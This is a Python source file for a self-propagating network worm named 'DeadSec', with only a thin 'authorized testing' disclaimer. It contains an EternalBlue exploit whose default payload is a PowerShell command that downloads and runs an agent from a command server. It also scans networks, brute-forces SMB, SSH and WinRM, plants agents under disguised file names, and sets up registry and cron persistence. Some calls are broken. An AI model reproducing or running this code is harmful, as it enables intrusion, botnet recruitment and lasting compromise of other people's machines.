#!/usr/bin/env python3
"""
DeadSec Network Worm
Advanced self-propagating malware for lateral movement and bot recruitment
FOR AUTHORIZED PENETRATION TESTING ONLY
"""

import os
import sys
import socket
import struct
import threading
import subprocess
import platform
import json
import base64
import hashlib
import time
import random
import shutil
from pathlib import Path
from datetime import datetime

# EternalBlue exploit dependencies
try:
    from impacket import smb, ntlm
    ETERNALBLUE_AVAILABLE = True
except ImportError:
    ETERNALBLUE_AVAILABLE = False
    print("[!] Warning: impacket not installed - EternalBlue exploit unavailable")
    print("[!] Install with: pip install impacket")

# EternalBlue exploit constants and configuration
EB_USERNAME = ''
EB_PASSWORD = ''
EB_NTFEA_SIZE = 0x9000
EB_TARGET_HAL_HEAP_ADDR = 0xffffffffffd04000
EB_SHELLCODE_PAGE_ADDR = (EB_TARGET_HAL_HEAP_ADDR + 0x400) & 0xfffffffffffff000
EB_PTE_ADDR = 0xfffff6ffffffe800 + 8*((EB_SHELLCODE_PAGE_ADDR-0xffffffffffd00000) >> 12)

# ============================================================================
# ETERNALBLUE EXPLOIT COMPONENTS (MS17-010)
# ============================================================================

if ETERNALBLUE_AVAILABLE:
    # NTFEA structure for buffer overflow
    ntfea9000 = struct.pack('<BBH', 0, 0, 0) + b'\x00'
    ntfea9000 += struct.pack('<BBH', 0, 0, EB_NTFEA_SIZE - 1) + b'\x00' * (EB_NTFEA_SIZE - 1)
    
    # Fake SRVNET_BUFFER structure for NX disabling
    fakeSrvNetBufferX64Nx = struct.pack('<QQQQHH', 0, 0, 0, EB_PTE_ADDR+7, 0x0060, 0x0800)
    fakeSrvNetBufferX64Nx += b'\x00' * 0x10
    fakeSrvNetBufferX64Nx += struct.pack('<QQ', 0, 0)
    fakeSrvNetBufferX64Nx += struct.pack('<QQ', 0, EB_TARGET_HAL_HEAP_ADDR)
    fakeSrvNetBufferX64Nx += b'\x00' * 0x20
    
    def createFakeSrvNetBuffer(sc_size):
        """Create fake SRVNET_BUFFER structure for shellcode execution"""
        addr_plus = EB_SHELLCODE_PAGE_ADDR + sc_size + 0x10
        fakeSrvNetBuffer = struct.pack('<QQQQHH', addr_plus, 0, 0, EB_SHELLCODE_PAGE_ADDR - 0x10, 0x0060, 0x0800)
        fakeSrvNetBuffer += b'\x00' * 0x10
        fakeSrvNetBuffer += struct.pack('<QQ', 0, addr_plus)
        fakeSrvNetBuffer += struct.pack('<QQ', 0, EB_TARGET_HAL_HEAP_ADDR)
        fakeSrvNetBuffer += b'\x00' * 0x20
        return fakeSrvNetBuffer
    
    def createFeaList(sc_size):
        """Create FEA list for NTFEA overflow"""
        feaList = struct.pack('<I', 0x10000)
        feaList += ntfea9000[:EB_NTFEA_SIZE]
        feaList += struct.pack('<BBH', 0, 0, 0) + b'\x00'
        feaList += struct.pack('<BBH', 0, 0, len(fakeSrvNetBufferX64Nx) - 1) + fakeSrvNetBufferX64Nx[1:]
        feaList += struct.pack('<BBH', 0, 0, 0) + b'\x00'
        feaList += struct.pack('<BBH', 0, 0, len(createFakeSrvNetBuffer(sc_size)) - 1) + createFakeSrvNetBuffer(sc_size)[1:]
        return feaList
    
    # Fake structure for SrvNetWskTransformedReceiveComplete
    fake_recv_struct = b'\x00' * 16
    fake_recv_struct += struct.pack('<QQ', 0, EB_TARGET_HAL_HEAP_ADDR + 0x58)
    
    # SMB packet extensions
    def getNTStatus(self):
        """Get NT status from SMB packet"""
        return struct.unpack('<I', self['Data'][:4])[0]
    
    def sendEcho(conn, tid, data):
        """Send SMB echo packet"""
        pkt = smb.NewSMBPacket()
        pkt['Tid'] = tid
        transCommand = smb.SMBCommand(smb.SMB.SMB_COM_ECHO)
        transCommand['Parameters'] = smb.SMBEcho_Parameters()
        transCommand['Data'] = smb.SMBEcho_Data()
        transCommand['Parameters']['EchoCount'] = 1
        transCommand['Data']['Data'] = data
        pkt.addCommand(transCommand)
        conn.sendSMB(pkt)
        return conn.recvSMB()
    
    class MYSMB(smb.SMB):
        """Custom SMB class that forces NTLMv1 authentication"""
        def __init__(self, remote_host, use_ntlmv2=False):
            self.__use_ntlmv2 = use_ntlmv2
            self._dialects_data = None
            self._dialects_parameters = None
            smb.SMB.__init__(self, '*SMBSERVER', remote_host, sess_port=445)
        
        def neg_session(self):
            neg_sess_setup = smb.SMB.neg_session(self, extended_security=smb.SMB.EXTENDED_SECURITY_REQUIRED if self.__use_ntlmv2 else smb.SMB.EXTENDED_SECURITY_OFF)
            self._dialects_parameters = neg_sess_setup['Parameters']
            self._dialects_data = neg_sess_setup['Data']
            return neg_sess_setup
    
    def createSessionAllocNonPaged(target, size):
        """Create SMB session with specific nonpaged pool allocation size"""
        conn = MYSMB(target)
        _, flags2 = conn.get_flags()
        flags2 &= ~smb.SMB.FLAGS2_EXTENDED_SECURITY
        conn.set_flags(flags2=flags2)
        
        # Allocate specific size in nonpaged pool
        if size >= 0x10000:
            allocSize = size - 0x4010
            conn.set_default_timeout(3)
            conn.get_socket().settimeout(3)
        else:
            allocSize = size
        
        # Use session setup parameters to control allocation
        pkt = smb.NewSMBPacket()
        sessionSetup = smb.SMBCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX)
        sessionSetup['Parameters'] = smb.SMBSessionSetupAndX_Parameters()
        sessionSetup['Parameters']['MaxBufferSize'] = 61440
        sessionSetup['Parameters']['MaxMpxCount'] = 2
        sessionSetup['Parameters']['VcNumber'] = 1
        sessionSetup['Parameters']['SessionKey'] = 0
        sessionSetup['Parameters']['SecurityBlobLength'] = 0
        sessionSetup['Parameters']['Capabilities'] = 0x80000000
        
        sessionSetup['Data'] = smb.SMBSessionSetupAndX_Data()
        sessionSetup['Data']['SecurityBlob'] = b'\x00' * allocSize
        sessionSetup['Data']['NativeOS'] = ''
        sessionSetup['Data']['NativeLanMan'] = ''
        pkt.addCommand(sessionSetup)
        
        conn.sendSMB(pkt)
        try:
            conn.recvSMB()
        except:
            pass
        
        return conn
    
    class SMBTransaction2Secondary_Parameters_Fixed(smb.SMBCommand_Parameters):
        """Fixed TRANSACTION2_SECONDARY parameters"""
        structure = (
            ('TotalParameterCount', '<H=0'),
            ('TotalDataCount', '<H'),
            ('ParameterCount', '<H=0'),
            ('ParameterOffset', '<H=0'),
            ('ParameterDisplacement', '<H=0'),
            ('DataCount', '<H'),
            ('DataOffset', '<H'),
            ('DataDisplacement', '<H=0'),
            ('FID', '<H=0'),
        )
    
    def send_trans2_second(conn, tid, data, displacement):
        """Send TRANSACTION2_SECONDARY packet"""
        pkt = smb.NewSMBPacket()
        pkt['Tid'] = tid
        command = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION2_SECONDARY)
        command['Parameters'] = SMBTransaction2Secondary_Parameters_Fixed()
        command['Data'] = smb.SMBTransaction2Secondary_Data()
        command['Parameters']['TotalParameterCount'] = 0
        command['Parameters']['TotalDataCount'] = len(data)
        command['Parameters']['ParameterCount'] = 0
        command['Parameters']['ParameterOffset'] = 0
        command['Parameters']['DataCount'] = len(data)
        command['Parameters']['DataOffset'] = 0x44
        command['Parameters']['DataDisplacement'] = displacement
        command['Data']['Trans_Parameters'] = b''
        command['Data']['Trans_Data'] = data
        pkt.addCommand(command)
        conn.sendSMB(pkt)
    
    def send_big_trans2(conn, tid, setup, data, param, firstDataFragmentSize, sendLastChunk):
        """Send large TRANSACTION2 request with fragmentation"""
        pkt = smb.NewSMBPacket()
        pkt['Tid'] = tid
        command = smb.SMBCommand(smb.SMB.SMB_COM_NT_TRANSACT)
        command['Parameters'] = smb.SMBNTTransaction_Parameters()
        command['Parameters']['MaxSetupCount'] = 1
        command['Parameters']['MaxParameterCount'] = len(param)
        command['Parameters']['MaxDataCount'] = 0
        command['Data'] = smb.SMBTransaction2_Data()
        command['Parameters']['Setup'] = setup
        command['Parameters']['TotalParameterCount'] = len(param)
        command['Parameters']['TotalDataCount'] = len(data)
        command['Parameters']['ParameterCount'] = len(param)
        command['Parameters']['DataCount'] = firstDataFragmentSize
        command['Data']['Trans_Parameters'] = param
        command['Data']['Trans_Data'] = data[:firstDataFragmentSize]
        conn.sendSMB(pkt)
        
        # Send remaining fragments
        i = firstDataFragmentSize
        while i < len(data):
            fragSize = min(4096, len(data) - i)
            if len(data) - i <= 4096:
                if not sendLastChunk:
                    break
            send_trans2_second(conn, tid, data[i:i+fragSize], i)
            i += fragSize
        
        if sendLastChunk:
            conn.recvSMB()
    
    def createConnectionWithBigSMBFirst80(target, for_nx=False):
        """Create connection with large SMB packet for buffer allocation"""
        sk = socket.socket()
        sk.settimeout(3)
        sk.connect((target, 445))
        
        # Send NBSS with large size (0x8100 for data, 0x8000 for NX)
        pkt = b'\x00' + (b'\x00\x81\x00' if for_nx else b'\x00\x80\x40')
        
        # Send negotiate protocol
        negotiateProtocol = smb.NewSMBPacket()
        command = smb.SMBCommand(smb.SMB.SMB_COM_NEGOTIATE)
        command['Data'] = smb.SMBNegotiate_Data()
        command['Data']['Dialects'] = [b'\x02NT LM 0.12\x00']
        negotiateProtocol.addCommand(command)
        
        pkt += negotiateProtocol.getData()
        sk.send(pkt)
        
        # Receive and verify negotiate response
        nb, _, _ = smb.NetBIOSTCPSession.read_packet(sk)
        
        # Send session setup
        sessionSetup = smb.NewSMBPacket()
        sessionSetup['Flags2'] = 0x01
        command = smb.SMBCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX)
        command['Parameters'] = smb.SMBSessionSetupAndX_Parameters()
        command['Parameters']['MaxBufferSize'] = 61440
        command['Parameters']['MaxMpxCount'] = 2
        command['Parameters']['VcNumber'] = 1
        command['Parameters']['SessionKey'] = 0
        command['Parameters']['AnsiPwdLength'] = 0
        command['Parameters']['UnicodePwdLength'] = 0
        command['Parameters']['Capabilities'] = 0x80000000
        command['Data'] = smb.SMBSessionSetupAndX_Data()
        command['Data']['AnsiPwd'] = b''
        command['Data']['UnicodePwd'] = b''
        command['Data']['Account'] = EB_USERNAME.encode('utf-16le')
        command['Data']['PrimaryDomain'] = b''
        command['Data']['NativeOS'] = 'Unix'
        command['Data']['NativeLanMan'] = 'Samba'
        sessionSetup.addCommand(command)
        
        sk.send(sessionSetup.getData())
        sk.recv(1024)
        
        return sk

class DeadSecWorm:
    """Advanced network worm with lateral movement capabilities"""
    
    def __init__(self, c2_server="http://localhost:5000"):
        self.c2_server = c2_server
        self.worm_id = self.generate_worm_id()
        self.infected_hosts = []
        self.network_map = {}
        
        # Exploitation vectors
        self.exploit_ports = {
            445: "SMB",           # Windows file sharing
            139: "NetBIOS",       # Windows networking
            135: "RPC",           # Windows RPC
            3389: "RDP",          # Remote Desktop
            22: "SSH",            # Secure Shell
            23: "Telnet",         # Telnet
            21: "FTP",            # File Transfer
            1433: "MSSQL",        # MS SQL Server
            3306: "MySQL",        # MySQL Database
            5432: "PostgreSQL",   # PostgreSQL
            27017: "MongoDB",     # MongoDB
            6379: "Redis",        # Redis
            5985: "WinRM",        # Windows Remote Management
            5986: "WinRM-HTTPS",  # WinRM over HTTPS
        }
        
        # Common credentials for brute force
        self.credentials = [
            ("admin", "admin"),
            ("administrator", "administrator"),
            ("root", "root"),
            ("root", "toor"),
            ("admin", "password"),
            ("admin", "123456"),
            ("user", "user"),
            ("guest", "guest"),
            ("test", "test"),
            ("sa", ""),  # SQL Server
            ("postgres", "postgres"),
        ]
        
        # Network ranges to scan (RFC1918 private networks)
        self.target_ranges = [
            "192.168.0.0/16",
            "10.0.0.0/8",
            "172.16.0.0/12"
        ]
    
    def generate_worm_id(self):
        """Generate unique worm instance ID"""
        import random
        import string
        random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        hostname = socket.gethostname()
        worm_id = f"WORM-{hashlib.md5(hostname.encode()).hexdigest()[:8]}-{random_part}"
        return worm_id
    
    def get_local_ip(self):
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            return "127.0.0.1"
    
    def get_network_range(self):
        """Determine local network range"""
        local_ip = self.get_local_ip()
        octets = local_ip.split('.')
        network = f"{octets[0]}.{octets[1]}.{octets[2]}.0/24"
        return network
    
    def ip_to_int(self, ip):
        """Convert IP address to integer"""
        return struct.unpack("!I", socket.inet_aton(ip))[0]
    
    def int_to_ip(self, num):
        """Convert integer to IP address"""
        return socket.inet_ntoa(struct.pack("!I", num))
    
    def cidr_to_ip_list(self, cidr):
        """Convert CIDR notation to list of IPs"""
        network, bits = cidr.split('/')
        bits = int(bits)
        
        # Calculate network range
        network_int = self.ip_to_int(network)
        host_bits = 32 - bits
        num_hosts = (1 << host_bits) - 2  # Exclude network and broadcast
        
        # Generate IP list (limit to 254 for performance)
        ip_list = []
        for i in range(1, min(num_hosts + 1, 255)):
            ip_list.append(self.int_to_ip(network_int + i))
        
        return ip_list
    
    def scan_port(self, host, port, timeout=0.5):
        """Scan single port on host"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def scan_host(self, host):
        """Scan host for vulnerable services"""
        print(f"[*] Scanning {host}...")
        open_ports = []
        
        for port, service in self.exploit_ports.items():
            if self.scan_port(host, port):
                open_ports.append((port, service))
                print(f"    [+] {host}:{port} ({service}) - OPEN")
        
        if open_ports:
            self.network_map[host] = open_ports
        
        return open_ports
    
    def network_discovery(self):
        """Discover hosts on local network"""
        print(f"\n[*] Starting network discovery...")
        print(f"[*] Local IP: {self.get_local_ip()}")
        
        # Get local network range
        network = self.get_network_range()
        print(f"[*] Scanning network: {network}")
        
        # Generate IP list
        ip_list = self.cidr_to_ip_list(network)
        
        # Scan hosts (parallel for speed)
        threads = []
        for ip in ip_list[:50]:  # Limit to 50 IPs for testing
            thread = threading.Thread(target=self.scan_host, args=(ip,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
            
            # Limit concurrent threads
            if len(threads) >= 20:
                for t in threads:
                    t.join(timeout=2)
                threads = []
        
        # Wait for remaining threads
        for thread in threads:
            thread.join(timeout=2)
        
        print(f"\n[+] Discovery complete: {len(self.network_map)} vulnerable hosts found")
        return self.network_map
    
    def exploit_eternalblue(self, target, shellcode=None, numGroomConn=13):
        """
        Exploit MS17-010 EternalBlue vulnerability for Windows 8/2012
        
        Args:
            target: Target IP address
            shellcode: Optional shellcode bytes (default: deploys python_agent.py)
            numGroomConn: Number of groom connections (default: 13)
        
        Returns:
            True if exploitation successful, False otherwise
        """
        if not ETERNALBLUE_AVAILABLE:
            print(f"    [!] EternalBlue unavailable - impacket not installed")
            return False
        
        print(f"[*] Attempting EternalBlue exploit on {target}...")
        
        try:
            # Generate default shellcode if none provided
            if shellcode is None:
                # Simple shellcode to download and execute python agent
                agent_url = f"{self.c2_server}/payloads/python_agent.py"
                shellcode_cmd = f'powershell -Command "IEX (New-Object Net.WebClient).DownloadString(\'{agent_url}\')"'
                shellcode = shellcode_cmd.encode('utf-8')
            
            # Pad shellcode to proper size
            if len(shellcode) < 0x400:
                shellcode += b'\x00' * (0x400 - len(shellcode))
            
            # Connect to target
            conn = MYSMB(target)
            _, flags2 = conn.get_flags()
            flags2 &= ~smb.SMB.FLAGS2_EXTENDED_SECURITY
            conn.set_flags(flags2=flags2)
            conn.login(EB_USERNAME, EB_PASSWORD)
            server_os = conn.get_server_os()
            print(f"    [+] Target OS: {server_os}")
            
            tid = conn.tree_connect_andx('\\\\' + target + '\\IPC$')
            conn.set_default_timeout(5)
            
            # Step 1: Create groom connections
            print(f"    [*] Creating {numGroomConn} groom connections...")
            recvPkts = []
            for i in range(numGroomConn):
                sk = createConnectionWithBigSMBFirst80(target, for_nx=(i == 0))
                recvPkts.append(sk)
            
            # Step 2: Allocate nonpaged pool memory
            print(f"    [*] Allocating nonpaged pool memory...")
            allocConn = createSessionAllocNonPaged(target, EB_NTFEA_SIZE + 0x2010)
            
            # Step 3: Create hole in nonpaged pool
            print(f"    [*] Creating hole in nonpaged pool...")
            for i in range(5):
                sk = createConnectionWithBigSMBFirst80(target, for_nx=False)
                recvPkts.append(sk)
            
            # Close allocation connection to free memory
            allocConn.get_socket().close()
            
            # Step 4: First trigger - disable NX bit
            print(f"    [*] Triggering NTFEA overflow (disable NX)...")
            feaList = createFeaList(len(shellcode))
            
            pkt = smb.NewSMBPacket()
            pkt['Tid'] = tid
            transCommand = smb.SMBCommand(smb.SMB.SMB_COM_NT_TRANSACT)
            transCommand['Parameters'] = smb.SMBNTTransaction_Parameters()
            transCommand['Parameters']['MaxSetupCount'] = 1
            transCommand['Parameters']['MaxParameterCount'] = EB_NTFEA_SIZE + 0x1000
            transCommand['Parameters']['MaxDataCount'] = 0
            transCommand['Data'] = smb.SMBTransaction2_Data()
            
            transCommand['Parameters']['Setup'] = struct.pack('<H', 0x0002)  # TRANS2_OPEN2
            transCommand['Parameters']['TotalParameterCount'] = len(feaList)
            transCommand['Parameters']['TotalDataCount'] = 0x1000
            transCommand['Parameters']['ParameterCount'] = len(feaList)
            transCommand['Parameters']['DataCount'] = 0
            
            transCommand['Data']['Trans_Parameters'] = feaList
            transCommand['Data']['Trans_Data'] = b''
            
            pkt.addCommand(transCommand)
            conn.sendSMB(pkt)
            
            try:
                recvPkt = conn.recvSMB()
                if recvPkt.getNTStatus() == 0xc000000d:  # STATUS_INVALID_PARAMETER
                    print(f"    [+] First trigger successful - NX disabled")
            except Exception as e:
                print(f"    [!] First trigger response: {e}")
            
            # Step 5: Second trigger - execute shellcode
            print(f"    [*] Sending shellcode...")
            for sk in recvPkts:
                try:
                    # Send fake structure + shellcode
                    data = fake_recv_struct + shellcode
                    sk.send(data)
                except:
                    pass
            
            # Step 6: Verify exploitation
            print(f"    [*] Triggering shellcode execution...")
            try:
                # Send echo to trigger receive completion
                sendEcho(conn, tid, b'A' * 0x1000)
                print(f"    [+] EternalBlue exploit successful!")
                
                # Report to C2
                self.report_to_c2({
                    'worm_id': self.worm_id,
                    'target': target,
                    'exploit': 'EternalBlue (MS17-010)',
                    'status': 'success',
                    'timestamp': datetime.datetime.now().isoformat()
                })
                
                return True
            except Exception as e:
                print(f"    [!] Shellcode execution failed: {e}")
                return False
        
        except Exception as e:
            print(f"    [!] EternalBlue exploit failed: {e}")
            return False
        
        finally:
            # Cleanup connections
            try:
                conn.logoff()
                conn.get_socket().close()
            except:
                pass
            
            for sk in recvPkts:
                try:
                    sk.close()
                except:
                    pass
    
    def exploit_smb(self, host):
        """Exploit SMB/Windows file sharing"""
        print(f"[*] Attempting SMB exploit on {host}...")
        
        # Try EternalBlue first (most effective for Windows 8/2012)
        if ETERNALBLUE_AVAILABLE:
            try:
                if self.exploit_eternalblue(host):
                    return True
            except Exception as e:
                print(f"    [!] EternalBlue attempt failed: {e}")
        
        try:
            # Fallback: Try to connect with common credentials
            for username, password in self.credentials[:5]:
                try:
                    # Use net use command on Windows
                    if platform.system() == 'Windows':
                        cmd = f'net use \\\\{host}\\IPC$ {password} /user:{username}'
                        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
                        
                        if result.returncode == 0:
                            print(f"    [+] SMB access gained: {username}:{password}")
                            return True
                except:
                    continue
            
            return False
        except Exception as e:
            print(f"    [!] SMB exploit failed: {e}")
            return False
    
    def exploit_ssh(self, host):
        """Exploit SSH with credential brute force"""
        print(f"[*] Attempting SSH exploit on {host}...")
        
        try:
            import paramiko
            
            for username, password in self.credentials[:5]:
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(host, username=username, password=password, timeout=3)
                    
                    print(f"    [+] SSH access gained: {username}:{password}")
                    
                    # Execute bot deployment
                    stdin, stdout, stderr = ssh.exec_command('uname -a')
                    print(f"    [+] Remote system: {stdout.read().decode().strip()}")
                    
                    ssh.close()
                    return True
                except:
                    continue
            
            return False
        except ImportError:
            print(f"    [!] paramiko not installed, skipping SSH")
            return False
        except Exception as e:
            print(f"    [!] SSH exploit failed: {e}")
            return False
    
    def exploit_rdp(self, host):
        """Check RDP availability"""
        print(f"[*] RDP detected on {host}:3389")
        print(f"    [!] Manual exploitation recommended")
        return False
    
    def exploit_winrm(self, host):
        """Exploit Windows Remote Management"""
        print(f"[*] Attempting WinRM exploit on {host}...")
        
        try:
            for username, password in self.credentials[:5]:
                try:
                    # Use winrm-cli or PowerShell remoting
                    if platform.system() == 'Windows':
                        cmd = f'powershell -Command "Test-WSMan -ComputerName {host} -Credential (New-Object System.Management.Automation.PSCredential(\'{username}\', (ConvertTo-SecureString \'{password}\' -AsPlainText -Force)))"'
                        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
                        
                        if "ProductVersion" in result.stdout:
                            print(f"    [+] WinRM access gained: {username}:{password}")
                            return True
                except:
                    continue
            
            return False
        except Exception as e:
            print(f"    [!] WinRM exploit failed: {e}")
            return False
    
    def deploy_bot_agent(self, host, method="smb"):
        """Deploy bot agent to compromised host"""
        print(f"[*] Deploying bot agent to {host}...")
        
        try:
            # Get bot agent payload
            agent_script = Path(__file__).parent / "python_agent.py"
            
            if not agent_script.exists():
                print(f"    [!] Bot agent not found")
                return False
            
            # Read agent code
            with open(agent_script, 'r') as f:
                agent_code = f.read()
            
            # Modify C2 server in agent
            agent_code = agent_code.replace(
                'c2_server = "http://localhost:5000"',
                f'c2_server = "{self.c2_server}"'
            )
            
            if method == "smb":
                # Copy via SMB share
                try:
                    remote_path = f"\\\\{host}\\C$\\Windows\\Temp\\svchost.py"
                    with open(remote_path, 'w') as f:
                        f.write(agent_code)
                    
                    # Execute remotely (requires PSExec or similar)
                    print(f"    [+] Agent deployed to {host}")
                    return True
                except:
                    print(f"    [!] Failed to copy agent via SMB")
                    return False
            
            elif method == "ssh":
                # Deploy via SSH
                try:
                    import paramiko
                    
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    # Reuse credentials from exploit
                    ssh.connect(host, username="root", password="root", timeout=3)
                    
                    # Upload agent
                    sftp = ssh.open_sftp()
                    remote_path = "/tmp/.system_daemon.py"
                    with sftp.file(remote_path, 'w') as f:
                        f.write(agent_code)
                    
                    # Make executable and run
                    ssh.exec_command(f"chmod +x {remote_path}")
                    ssh.exec_command(f"nohup python3 {remote_path} &")
                    
                    sftp.close()
                    ssh.close()
                    
                    print(f"    [+] Agent deployed and running on {host}")
                    return True
                except:
                    return False
            
            return False
            
        except Exception as e:
            print(f"    [!] Deployment failed: {e}")
            return False
    
    def lateral_movement(self):
        """Execute lateral movement across network"""
        print(f"\n[*] Initiating lateral movement...")
        
        for host, services in self.network_map.items():
            print(f"\n[*] Targeting {host}...")
            
            exploited = False
            
            for port, service in services:
                if exploited:
                    break
                
                if service == "SMB":
                    exploited = self.exploit_smb(host)
                    if exploited:
                        self.deploy_bot_agent(host, method="smb")
                
                elif service == "SSH":
                    exploited = self.exploit_ssh(host)
                    if exploited:
                        self.deploy_bot_agent(host, method="ssh")
                
                elif service == "WinRM":
                    exploited = self.exploit_winrm(host)
                
                elif service == "RDP":
                    self.exploit_rdp(host)
            
            if exploited:
                self.infected_hosts.append(host)
                print(f"[+] {host} compromised and added to botnet")
        
        return len(self.infected_hosts)
    
    def persistence_windows(self):
        """Establish persistence on Windows"""
        try:
            if platform.system() != 'Windows':
                return False
            
            # Copy self to startup
            startup_path = Path(os.environ['APPDATA']) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup" / "SystemService.pyw"
            
            # Copy current script
            shutil.copy(__file__, startup_path)
            
            # Add registry key
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "SystemService", 0, winreg.REG_SZ, str(startup_path))
            winreg.CloseKey(key)
            
            print(f"[+] Persistence established on Windows")
            return True
        except Exception as e:
            print(f"[!] Persistence failed: {e}")
            return False
    
    def persistence_linux(self):
        """Establish persistence on Linux"""
        try:
            if platform.system() != 'Linux':
                return False
            
            # Add to crontab
            cron_entry = f"@reboot python3 {__file__}"
            
            # Get current crontab
            result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
            current_cron = result.stdout
            
            if cron_entry not in current_cron:
                new_cron = current_cron + f"\n{cron_entry}\n"
                process = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE, text=True)
                process.communicate(input=new_cron)
            
            print(f"[+] Persistence established on Linux")
            return True
        except Exception as e:
            print(f"[!] Persistence failed: {e}")
            return False
    
    def report_to_c2(self):
        """Report worm activity to C2 server"""
        try:
            import requests
            
            data = {
                'worm_id': self.worm_id,
                'hostname': socket.gethostname(),
                'local_ip': self.get_local_ip(),
                'infected_hosts': self.infected_hosts,
                'vulnerable_hosts': len(self.network_map),
                'timestamp': datetime.now().isoformat()
            }
            
            response = requests.post(
                f"{self.c2_server}/worm_report",
                json=data,
                timeout=10
            )
            
            if response.status_code == 200:
                print(f"[+] Activity reported to C2 server")
                return True
        except Exception as e:
            print(f"[!] C2 reporting failed: {e}")
        
        return False
    
    def execute(self, aggressive=False):
        """Execute worm propagation"""
        print("\n" + "="*60)
        print("  DEADSEC NETWORK WORM // PROPAGATION MODULE")
        print("="*60 + "\n")
        
        print(f"[*] Worm ID: {self.worm_id}")
        print(f"[*] Target: {self.get_local_ip()}")
        print(f"[*] Mode: {'AGGRESSIVE' if aggressive else 'STEALTH'}")
        
        # Step 1: Network Discovery
        self.network_discovery()
        
        # Step 2: Lateral Movement
        if len(self.network_map) > 0:
            infected = self.lateral_movement()
            print(f"\n[+] Lateral movement complete: {infected} hosts compromised")
        else:
            print(f"\n[!] No vulnerable hosts found")
        
        # Step 3: Establish Persistence
        print(f"\n[*] Establishing persistence...")
        if platform.system() == 'Windows':
            self.persistence_windows()
        else:
            self.persistence_linux()
        
        # Step 4: Report to C2
        print(f"\n[*] Reporting to C2 server...")
        self.report_to_c2()
        
        print("\n" + "="*60)
        print(f"  PROPAGATION COMPLETE // {len(self.infected_hosts)} NEW BOTS RECRUITED")
        print("="*60 + "\n")
        
        return {
            'worm_id': self.worm_id,
            'infected_hosts': self.infected_hosts,
            'vulnerable_hosts': len(self.network_map)
        }

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='DeadSec Network Worm')
    parser.add_argument('--c2', default='http://localhost:5000', help='C2 server URL')
    parser.add_argument('--aggressive', action='store_true', help='Aggressive propagation mode')
    
    args = parser.parse_args()
    
    worm = DeadSecWorm(c2_server=args.c2)
    worm.execute(aggressive=args.aggressive)

if __name__ == "__main__":
    main()
